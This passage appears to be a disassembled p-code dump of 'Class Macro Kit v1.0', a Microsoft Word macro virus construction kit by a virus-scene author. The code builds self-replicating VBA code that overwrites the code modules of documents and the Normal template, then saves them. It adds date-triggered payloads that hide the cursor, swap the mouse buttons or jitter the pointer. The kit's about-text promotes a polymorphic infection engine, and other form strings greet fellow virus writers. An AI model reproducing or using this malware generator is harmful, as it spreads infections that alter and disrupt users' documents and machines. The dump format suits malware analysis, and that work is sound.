' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x000C 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A " = 2 Then "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 ") = "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000B ") & vbcr & "
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " & "
' 	Concat 
' 	LitDI2 0x000B 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #126:
' 	Ld VirusCode 
' 	LitDI2 0x0011 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " & "
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "("
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 ") & vbcr"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #127:
' 	Ld VirusCode 
' 	LitDI2 0x0018 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 ":"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #128:
' 	Ld VirusCode 
' 	LitStr 0x0005 "Next "
' 	Concat 
' 	LitDI2 0x000A 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #129:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x001C ".CountOfLines < (0 + 2) Then"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #130:
' 	Ld VirusCode 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0010 ".DeleteLines 1, "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ".CountOfLines: "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ".AddFromString "
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #131:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0044 " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #132:
' 	Ld VirusCode 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #133:
' Line #134:
' 	ElseBlock 
' Line #135:
' Line #136:
' 	Ld VirusCode 
' 	LitDI2 0x0011 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A ".Lines(1, "
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000E ".CountOfLines)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #137:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Set "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0025 ".VBProject.VBComponents(1).CodeModule"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #138:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x001C ".CountOfLines < (0 + 2) Then"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #139:
' 	Ld VirusCode 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0010 ".DeleteLines 1, "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ".CountOfLines: "
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000F ".AddFromString "
' 	Concat 
' 	LitDI2 0x0011 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #140:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0044 " = ActiveDocument Then ActiveDocument.SaveAs ActiveDocument.FullName"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #141:
' 	Ld VirusCode 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #142:
' Line #143:
' 	EndIfBlock 
' Line #144:
' Line #145:
' 	Ld Payload 
' 	LitDI2 0x0004 
' 	Ne 
' 	IfBlock 
' Line #146:
' Line #147:
' 	Ld Tage 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Monate 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0010 "If Day(Now()) = "
' 	Concat 
' 	Ld Tage 
' 	Concat 
' 	LitStr 0x0014 " And Month(Now()) = "
' 	Concat 
' 	Ld Monate 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #148:
' 	Ld Tage 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Monate 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0010 "If Day(Now()) = "
' 	Concat 
' 	Ld Tage 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #149:
' 	Ld Tage 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld Monate 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0012 "If Month(Now()) = "
' 	Concat 
' 	Ld Monate 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' Line #150:
' Line #151:
' 	EndIfBlock 
' Line #152:
' Line #153:
' 	Ld Payload 
' 	SelectCase 
' Line #154:
' Line #155:
' 	LitDI2 0x0000 
' 	Case 
' 	CaseDone 
' Line #156:
' Line #157:
' 	Ld VirusCode 
' 	LitStr 0x001C "While ShowCursor(False) >= 0"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #158:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Wend"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #159:
' Line #160:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #161:
' Line #162:
' 	Ld VirusCode 
' 	LitStr 0x0013 "SwapMouseButton &H2"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #163:
' Line #164:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #165:
' Line #166:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #167:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0008 " As Long"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #168:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 " As "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #169:
' 	Ld VirusCode 
' 	LitStr 0x0002 "Do"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #170:
' 	Ld VirusCode 
' 	LitStr 0x000D "GetCursorPos "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #171:
' 	Ld VirusCode 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = Rnd(2)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #172:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A " = 0 Then "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000B " = -5 Else "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 5"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #173:
' 	Ld VirusCode 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0009 " = Rnd(2)"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #174:
' 	Ld VirusCode 
' 	LitStr 0x0003 "If "
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000A " = 0 Then "
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x000B " = -5 Else "
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 " = 5"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #175:
' 	Ld VirusCode 
' 	LitStr 0x000D "SetCursorPos "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0016 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0012 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0017 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0003 " + "
' 	Concat 
' 	LitDI2 0x0013 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #176:
' 	Ld VirusCode 
' 	LitStr 0x0007 "Sleep 2"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #177:
' 	Ld VirusCode 
' 	LitStr 0x0008 "DoEvents"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #178:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Loop"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #179:
' Line #180:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #181:
' Line #182:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Dim "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0004 " As "
' 	Concat 
' 	LitDI2 0x0015 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #183:
' 	Ld VirusCode 
' 	LitStr 0x000D "GetCursorPos "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #184:
' 	Ld VirusCode 
' 	LitStr 0x0002 "Do"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #185:
' 	Ld VirusCode 
' 	LitStr 0x000D "SetCursorPos "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0016 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0002 ", "
' 	Concat 
' 	LitDI2 0x0014 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	LitStr 0x0001 "."
' 	Concat 
' 	LitDI2 0x0017 
' 	ArgsLd Variable 0x0001 
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #186:
' 	Ld VirusCode 
' 	LitStr 0x0004 "Loop"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #187:
' Line #188:
' 	EndSelect 
' Line #189:
' Line #190:
' Line #191:
' 	Ld Payload 
' 	LitDI2 0x0004 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Tage 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Monate 
' 	LitDI2 0x0000 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld VirusCode 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' 	EndIf 
' 	EndIf 
' Line #192:
' Line #193:
' 	Ld VirusCode 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St VirusCode 
' Line #194:
' 	Ld VirusCode 
' 	LitStr 0x0040 "Rem Another macro bug by jackie twoflower's Class Macro Kit v1.0"
' 	Concat 
' 	Ld PiEChar 
' 	Concat 
' 	St VirusCode 
' Line #195:
' Line #196:
' 	QuoteRem 0x0000 0x0020 "---------------> Create Document"
' Line #197:
' Line #198:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed Newtemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #199:
' Line #200:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #201:
' Line #202:
' 	LitStr 0x0018 "A wonderful class macro!"
' 	MemStWith Title 
' Line #203:
' 	LitStr 0x0025 "-jackie twoflower/LineZer0/Metaphase-"
' 	MemStWith Author 
' Line #204:
' 	LitStr 0x001F "Created by Class Macro Kit v1.0"
' 	MemStWith Comments 
' Line #205:
' 	ArgsMemCallWith Execute 0x0000 
' Line #206:
' Line #207:
' 	EndWith 
' Line #208:
' Line #209:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld ThaName 
' 	Concat 
' 	LitStr 0x0004 ".doc"
' 	Concat 
' 	St ThePath 
' Line #210:
' Line #211:
' 	Ld ThePath 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld ThaName 
' 	LitStr 0x0004 ".doc"
' 	Concat 
' 	Paren 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #212:
' Line #213:
' 	Ld VirusCode 
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #214:
' 	Ld ThePath 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed fileformat 
' 	LitVarSpecial (False)
' 	ParamNamed addtorecentfiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #215:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #216:
' Line #217:
' 	LitStr 0x0006 "Class."
' 	Ld ThaName 
' 	Concat 
' 	LitStr 0x0010 " was created in "
' 	Concat 
' 	Ld ThePath 
' 	Concat 
' 	LitDI2 0x0040 
' 	LitStr 0x0008 "CMK v1.0"
' 	ArgsCall MsgBox 0x0003 
' Line #218:
' Line #219:
' 	ElseBlock 
' Line #220:
' Line #221:
' 	LitStr 0x001D "This document already exists!"
' 	LitDI2 0x0010 
' 	LitStr 0x000A "CMK Error!"
' 	ArgsCall MsgBox 0x0003 
' Line #222:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #223:
' 	ExitSub 
' Line #224:
' Line #225:
' 	EndIfBlock 
' Line #226:
' Line #227:
' 	QuoteRem 0x0000 0x0039 " This delete code is taken from CPCK by VicodinES. Thanks"
' Line #228:
' Line #229:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld OldLines 
' 	Ne 
' 	IfBlock 
' Line #230:
' Line #231:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #232:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #233:
' Line #234:
' 	EndIfBlock 
' Line #235:
' Line #236:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�This  macro   kit   was   coded  to  promote   my newest    development   called   PiE,   short   for Polymorphic    infection    Engine,    which   is   a combination   of  poly code  and infection code. The  kit  also  contains  some  selected  special payloads   which   were   published  in  LineZer0 zine #1.  If  you  do not select the Polymorphic options   there   will   be  no  PiE  engine  added. Every  class   macro   will   contain   a   payload. Finally  I  hope  you like this kit and toy around with it!

Have phun,

-jackie twoflower/Lz0NT/MVT-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmAbout/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  Day (0 for every)       Month (0 for every)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmDatum/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f0reg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HeXcrasher^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�darkman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Serialkillerg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Spo0ky@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�The Might�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Zer0g
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Gigabyteg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Lord_Arzg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Fletcherg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VicodinES�^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tally
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Slagehammer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Knowdethg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.CMK' - OLE stream: 'Macros/frmGreets/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ruzz#
-------------------------------------------------------------------------------
